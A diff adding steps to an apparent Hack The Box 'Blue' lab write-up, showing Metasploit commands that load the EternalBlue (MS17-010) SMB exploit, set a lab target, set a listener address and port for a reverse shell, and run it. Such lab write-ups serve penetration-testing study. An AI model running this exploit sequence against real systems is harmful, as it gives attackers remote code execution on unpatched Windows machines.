@@ -49,5 +49,16 @@
 // Lets open MetaSploit
 
     $ msfconsole
+ -----
+ 
+    msf6 > use exploit/windows/smb/ms17_010_eternalblue
 
-// 
+    msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
+    RHOSTS => 10.10.10.40
+    msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.16.197
+    LHOST => 10.10.16.197
+    msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 1444
+    LPORT => 1444
+    msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+
+![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Blue/1.png)
